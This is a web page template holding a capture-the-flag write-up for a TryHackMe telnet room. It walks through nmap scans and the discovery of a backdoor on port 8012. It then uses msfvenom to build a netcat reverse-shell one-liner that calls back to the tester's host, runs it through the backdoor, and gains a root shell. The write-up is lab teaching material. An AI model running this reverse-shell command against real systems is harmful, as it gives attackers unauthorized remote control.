{% extends "base.html" %}{% block title %}Intro to Networking{%endblock%}
{% block content %}

<div class="container">
    <h1 id="typing-effect" class="display-2 mb-4"></h1> 
    <br />

    <div class="solution-div">

    <p>In this page I show how to solve the Exploiting Telnet - Network Services room CTF on TryHackMe platform.
    </p>

    <h2>Enumeration</h2>

    <p>Let's start our enumeration process with Nmap port scanning. A simple nmap gives us:</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap 10.10.137.158
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 23:33 -03
            Nmap scan report for 10.10.137.158
            Host is up (0.23s latency).
            All 1000 scanned ports on 10.10.137.158 are in ignored states.
            Not shown: 1000 closed tcp ports (conn-refused)
                
            Nmap done: 1 IP address (1 host up) scanned in 27.98 seconds                     
            </code>
        </pre>
    </div>

    <p>It seems that the top 1000 ports are closed. We need to scan for higher ports. To do so, we will use the -p- flag to scan 
        for all ports in the server.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap -p- 10.10.137.158
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 23:42 -03
            Nmap scan report for 10.10.137.158
            Host is up (0.23s latency).
            Not shown: 65534 closed tcp ports (conn-refused)
            PORT     STATE SERVICE
            8012/tcp open  unknown
                
            Nmap done: 1 IP address (1 host up) scanned in 1546.08 seconds                    
            </code>
        </pre>
    </div>

    <p>
        We can see that the only port open is port 8012. The service shown is unknown. We can try to run nmap again with the -sV switch to 
        see if we can gather more information about this port:
    </p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
                └─$ nmap -p 8012 -sV 10.10.137.158 
                Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 00:07 -03
                Nmap scan report for 10.10.137.158
                Host is up (0.23s latency).
                
                PORT     STATE SERVICE VERSION
                8012/tcp open  unknown
                1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
                SF-Port8012-TCP:V=7.94%I=7%D=8/23%Time=64E5780E%P=x86_64-pc-linux-gnu%r(NU
                SF:LL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20command
                SF:s\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\
                SF:x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\
                SF:x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20BA
                SF:CKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest,
                SF:2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n
                SF:")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view
                SF:\x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Ty
                SF:pe\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"SK
                SF:IDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(H
                SF:elp,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
                SF:ds\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20t
                SF:o\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKDOO
                SF:R\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2E,
                SF:"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%
                SF:r(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x2
                SF:0commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\
                SF:x20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20T
                SF:ype\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"SKI
                SF:DY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LP
                SF:DString,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20co
                SF:mmands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\
                SF:x20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x
                SF:20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY'S
                SF:\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LANDes
                SF:k-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comma
                SF:nds\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x2
                SF:0to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20
                SF:\.HELP\x20to\x20view\x20commands\n");
                
                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
                Nmap done: 1 IP address (1 host up) scanned in 173.55 seconds    
            </code>
        </pre>
    </div>


    <h2>Exploitation</h2>

    <p>Note that we found something with the name of Skidy's backdoor, indicating this port is being used as a backdoor, and Skidy might be 
        the user associated with it. We can use telnet command to connect to the telnet server here:
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            Trying 10.10.157.242...
            Connected to 10.10.157.242.
            Escape character is '^]'.
            SKIDY'S BACKDOOR. Type .HELP to view commands
            .HELP
            .HELP: View commands
             .RUN &lt;command&gt;: Execute commands
            .EXIT: Exit
                               
            </code>
        </pre>
    </div>

    <p>We have successfully established a connection. However, the available commands are limited within this telnet prompt. The .RUN command seems promising to inject a reverse shell. Since we have identified it as a backdoor, we can potentially use this port as a means to access the server. Let's create a reverse shell using `msfvenom`. The concept here is as follows: since we are unable to execute useful commands in the telnet prompt, we can create a reverse shell, run it from telnet to establish a connection from our local machine to the server. For this purpose, we can use the following command with `msfvenom`:</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.18.5.100 lport=4444 R
            [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
            [-] No arch selected, selecting arch: cmd from the payload
            No encoder specified, outputting raw payload
            Payload size: 97 bytes
            mkfifo /tmp/taglfx; nc 10.18.5.100 4444 0&lt;/tmp/taglfx | /bin/sh &gt;/tmp/taglfx 2&gt;&amp;1; rm /tmp/taglfx    
            </code>
        </pre>
    </div>   

    <p>Note that we have generated a reverse netcat shell payload using msfvenom, and it is:</p>

    <P><code class="hljs language-python"><span class="hljs-keyword">mkfifo /tmp/taglfx; nc 10.18.5.100 4444 0&lt;/tmp/taglfx | /bin/sh &gt;/tmp/taglfx 2&gt;&amp;1; rm /tmp/taglfx </span></code></P>

    <p>This reverse shell is designed to execute within the telnet server and establish a tunnel from it to our local machine when we open our netcat. Let's proceed by opening a netcat on our local machine using the command <code class="hljs language-python">nc -lnvp 4444</code> and executing the following command within the telnet server:</p>

    <p>
        <code class="hljs language-python"><span class="hljs-keyword">.RUN mkfifo /tmp/taglfx; nc 10.18.5.100 4444 0&lt;/tmp/taglfx | /bin/sh &gt;/tmp/taglfx 2&gt;&amp;1; rm /tmp/taglfx</span></code> inside the telnet 
        server.
    </p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ telnet 10.10.124.71 8012 
            Trying 10.10.124.71...
            Connected to 10.10.124.71.
            Escape character is '^]'.
            SKIDY'S BACKDOOR. Type .HELP to view commands
            .RUN mkfifo /tmp/taglfx; nc 10.18.5.100 4444 0&lt;/tmp/taglfx | /bin/sh &gt;/tmp/taglfx 2&gt;&amp;1; rm /tmp/taglfx   
            </code>
        </pre>
    </div>  

    <p>After executing this command, we have established a connection, as indicated by the following output in our netcat:</p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">  
            └─$ nc -lnvp 4444
            listening on [any] 4444 ...
            connect to [10.18.5.100] from (UNKNOWN) [10.10.124.71] 58750
            whoami
            root
            ls
            flag.txt
            </code>
        </pre>
    </div>

    <p>And we have found the flag!</p>

    <a href="/ctfs">Go back</a>


    </div>

</div>


{% endblock %}